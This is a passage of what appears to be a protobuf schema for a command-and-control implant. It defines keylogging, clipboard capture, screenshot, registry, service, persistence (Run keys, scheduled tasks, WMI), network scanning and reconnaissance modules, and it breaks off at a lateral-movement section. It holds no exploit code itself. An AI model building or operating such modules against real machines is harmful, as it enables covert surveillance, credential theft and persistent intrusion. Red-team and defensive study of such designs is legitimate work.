  rpc DeletePayload(DeletePayloadRequest) returns (DeletePayloadResponse);
}

// =============================================================================
// Phase 8: Reconnaissance & Collection Modules
// =============================================================================

// --- Screenshot Module ---

message ScreenshotTask {
  optional uint32 monitor = 1;      // Monitor index (0 = primary, 0xFFFFFFFF = all)
  optional uint32 quality = 2;      // JPEG quality 1-100 (default: 80)
  optional string format = 3;       // "png" or "jpeg" (default: jpeg)
  optional bool include_cursor = 4; // Include mouse cursor (default: false)
}

message ScreenshotResult {
  bytes data = 1;                   // Encoded image data
  uint32 width = 2;
  uint32 height = 3;
  string format = 4;
  uint32 monitor_index = 5;
  uint64 captured_at = 6;           // Unix timestamp
}

// --- Keylogger Module ---

message KeylogTask {
  oneof operation {
    KeylogStart start = 1;
    KeylogStop stop = 2;
    KeylogDump dump = 3;
  }
}

message KeylogStart {
  optional uint32 buffer_size = 1;      // Max chars before auto-flush (default: 4096)
  optional uint32 flush_interval_ms = 2; // Auto-flush interval (default: 60000)
  optional bool track_window = 3;       // Include window titles (default: true)
  optional bool track_clipboard = 4;    // Also capture clipboard changes (default: false)
}

message KeylogStop {}

message KeylogDump {}

message KeylogResult {
  repeated KeylogEntry entries = 1;
  uint64 start_time = 2;
  uint64 end_time = 3;
  uint32 total_keystrokes = 4;
}

message KeylogEntry {
  string window_title = 1;
  string process_name = 2;
  string keystrokes = 3;
  uint64 timestamp = 4;
}

// --- Clipboard Module ---

message ClipboardTask {
  oneof operation {
    ClipboardGet get = 1;
    ClipboardSet set = 2;
    ClipboardMonitorStart monitor_start = 3;
    ClipboardMonitorStop monitor_stop = 4;
    ClipboardDump dump = 5;
  }
}

message ClipboardGet {}

message ClipboardSet {
  string text = 1;
}

message ClipboardMonitorStart {
  optional uint32 max_entries = 1;  // Max entries to buffer (default: 100)
  optional bool dedupe = 2;         // Skip duplicate consecutive entries (default: true)
}

message ClipboardMonitorStop {}

message ClipboardDump {}

message ClipboardResult {
  repeated ClipboardEntry entries = 1;
}

message ClipboardEntry {
  string text = 1;
  string format = 2;                // CF_TEXT, CF_UNICODETEXT, etc.
  uint64 timestamp = 3;
  optional string source_window = 4;
}

// --- Process Module (Enhanced) ---

message ProcessTask {
  oneof operation {
    ProcessListAll list = 1;
    ProcessKill kill = 2;
    ProcessTree tree = 3;
    ProcessModules modules = 4;
  }
}

message ProcessListAll {
  optional bool include_modules = 1;
  optional bool include_threads = 2;
  optional string name_filter = 3;      // Filter by process name (regex)
}

message ProcessKill {
  uint32 pid = 1;
  optional bool force = 2;              // TerminateProcess vs graceful
}

message ProcessTree {
  optional uint32 root_pid = 1;         // Start from specific PID (0 = all)
}

message ProcessModules {
  uint32 pid = 1;
}

message ProcessListResult {
  repeated ProcessInfoDetailed processes = 1;
}

message ProcessInfoDetailed {
  uint32 pid = 1;
  uint32 ppid = 2;
  string name = 3;
  string path = 4;
  string command_line = 5;
  string user = 6;
  string integrity = 7;                 // Low, Medium, High, System
  uint64 start_time = 8;
  bool is_64bit = 9;
  uint32 session_id = 10;
  uint64 memory_usage = 11;             // Working set in bytes
  repeated string loaded_modules = 12;
  repeated ThreadInfoDetailed threads = 13;
}

message ThreadInfoDetailed {
  uint32 tid = 1;
  uint64 start_address = 2;
  string state = 3;                     // Running, Waiting, etc.
  uint32 priority = 4;
}

message ProcessTreeResult {
  repeated ProcessTreeNode nodes = 1;
}

message ProcessTreeNode {
  ProcessInfoDetailed process = 1;
  repeated ProcessTreeNode children = 2;
}

message ProcessModulesResult {
  uint32 pid = 1;
  repeated ModuleInfoDetailed modules = 2;
}

message ModuleInfoDetailed {
  string name = 1;
  string path = 2;
  uint64 base_address = 3;
  uint64 size = 4;
  string version = 5;
  string description = 6;
}

// --- Registry Module (Windows) ---

message RegistryTask {
  oneof operation {
    RegQuery query = 1;
    RegSet set = 2;
    RegDelete delete = 3;
    RegEnumKeys enum_keys = 4;
    RegEnumValues enum_values = 5;
  }
}

message RegQuery {
  string key_path = 1;              // e.g., "HKLM\\SOFTWARE\\Microsoft"
  optional string value_name = 2;   // Empty for default value
}

message RegSet {
  string key_path = 1;
  string value_name = 2;
  bytes data = 3;
  uint32 value_type = 4;            // REG_SZ=1, REG_DWORD=4, REG_BINARY=3, etc.
  optional bool create_key = 5;     // Create key if not exists
}

message RegDelete {
  string key_path = 1;
  optional string value_name = 2;   // If empty, delete entire key
  optional bool recursive = 3;      // Delete subkeys recursively
}

message RegEnumKeys {
  string key_path = 1;
  optional bool recursive = 2;
}

message RegEnumValues {
  string key_path = 1;
}

message RegistryResult {
  repeated RegistryEntry entries = 1;
}

message RegistryEntry {
  string key_path = 1;
  string value_name = 2;
  bytes data = 3;
  string value_type = 4;            // String representation
}

message RegEnumKeysResult {
  repeated string subkeys = 1;
}

message RegEnumValuesResult {
  repeated RegistryEntry values = 1;
}

// --- Service Module (Windows) ---

message ServiceTask {
  oneof operation {
    SvcList list = 1;
    SvcQuery query = 2;
    SvcCreate create = 3;
    SvcDelete delete = 4;
    SvcStart start = 5;
    SvcStop stop = 6;
    SvcModify modify = 7;
  }
}

message SvcList {
  optional string name_filter = 1;
  optional bool running_only = 2;
}

message SvcQuery {
  string name = 1;
}

message SvcCreate {
  string name = 1;
  string display_name = 2;
  string binary_path = 3;
  optional string description = 4;
  optional uint32 start_type = 5;   // 2=Auto, 3=Manual, 4=Disabled
  optional string account = 6;      // LocalSystem, NetworkService, etc.
}

message SvcDelete {
  string name = 1;
}

message SvcStart {
  string name = 1;
}

message SvcStop {
  string name = 1;
}

message SvcModify {
  string name = 1;
  optional string binary_path = 2;
  optional uint32 start_type = 3;
  optional string description = 4;
}

message ServiceListResult {
  repeated ServiceInfoDetailed services = 1;
}

message ServiceInfoDetailed {
  string name = 1;
  string display_name = 2;
  string binary_path = 3;
  string status = 4;                // Running, Stopped, etc.
  string start_type = 5;            // Auto, Manual, Disabled
  string account = 6;
  uint32 pid = 7;
  string description = 8;
}

// --- Persistence Module ---

enum PersistenceMethod {
  PERSIST_UNKNOWN = 0;
  PERSIST_REGISTRY_RUN = 1;
  PERSIST_REGISTRY_RUNONCE = 2;
  PERSIST_SCHEDULED_TASK = 3;
  PERSIST_SERVICE = 4;
  PERSIST_STARTUP_FOLDER = 5;
  PERSIST_WMI_SUBSCRIPTION = 6;
  PERSIST_LOGON_SCRIPT = 7;
}

message PersistenceTask {
  oneof operation {
    PersistInstall install = 1;
    PersistRemove remove = 2;
    PersistList list = 3;
  }
}

message PersistInstall {
  PersistenceMethod method = 1;
  string name = 2;
  string payload_path = 3;
  optional string arguments = 4;
  optional string trigger = 5;      // For scheduled tasks: "daily", "logon", etc.
  optional bool user_level = 6;     // User vs system level (default: user)
}

message PersistRemove {
  PersistenceMethod method = 1;
  string name = 2;
}

message PersistList {}

message PersistenceResult {
  repeated PersistenceEntry entries = 1;
}

message PersistenceEntry {
  PersistenceMethod method = 1;
  string name = 2;
  string location = 3;
  string payload = 4;
  string status = 5;
}

// --- Scan Module ---

message ScanTask {
  oneof operation {
    PortScan port_scan = 1;
    PingSweep ping_sweep = 2;
    ShareEnum share_enum = 3;
  }
}

message PortScan {
  string target = 1;               // IP or hostname
  repeated uint32 ports = 2;       // Specific ports
  optional uint32 start_port = 3;  // Range start
  optional uint32 end_port = 4;    // Range end
  optional uint32 timeout_ms = 5;  // Per-port timeout
  optional uint32 threads = 6;     // Concurrent scans
}

message PingSweep {
  string subnet = 1;               // e.g., "192.168.1.0/24"
  optional uint32 timeout_ms = 2;
  optional uint32 threads = 3;
}

message ShareEnum {
  string target = 1;               // Hostname or IP
}

message ScanResult {
  oneof result {
    PortScanResult port_result = 1;
    PingSweepResult ping_result = 2;
    ShareEnumResult share_result = 3;
  }
}

message PortScanResult {
  string target = 1;
  repeated OpenPort open_ports = 2;
}

message OpenPort {
  uint32 port = 1;
  string service = 2;              // Guessed service name
  string banner = 3;               // Optional banner grab
}

message PingSweepResult {
  repeated string live_hosts = 1;
  uint32 total_scanned = 2;
}

message ShareEnumResult {
  string target = 1;
  repeated ShareInfo shares = 2;
}

message ShareInfo {
  string name = 1;
  string share_type = 2;           // Disk, Printer, IPC, etc.
  string path = 3;
  string remark = 4;
}

// --- Environment Module ---

message EnvTask {
  oneof operation {
    GetSystemInfo system_info = 1;
    GetNetworkInfo network_info = 2;
    GetEnvVars env_vars = 3;
    WhoAmI whoami = 4;
  }
}

message GetSystemInfo {}
message GetNetworkInfo {}
message GetEnvVars {}
message WhoAmI {}

message EnvResult {
  oneof result {
    SystemInfoResult system = 1;
    NetworkInfoResult network = 2;
    EnvVarsResult env_vars = 3;
    WhoAmIResult whoami = 4;
  }
}

message SystemInfoResult {
  string os_name = 1;
  string os_version = 2;
  string architecture = 3;
  string computer_name = 4;
  string domain = 5;
  uint64 uptime_seconds = 6;
  uint64 total_memory = 7;
  uint32 cpu_count = 8;
}

message NetworkInfoResult {
  repeated NetworkInterface interfaces = 1;
  repeated string dns_servers = 2;
  string default_gateway = 3;
}

message NetworkInterface {
  string name = 1;
  string mac_address = 2;
  repeated string ipv4_addresses = 3;
  repeated string ipv6_addresses = 4;
  bool is_up = 5;
}

message EnvVarsResult {
  map<string, string> variables = 1;
}

message WhoAmIResult {
  string username = 1;
  string domain = 2;
  string sid = 3;
  repeated string groups = 4;
  string integrity_level = 5;
  bool is_elevated = 6;
}

// --- Lateral Movement Module ---

message LateralTask {
  oneof operation {
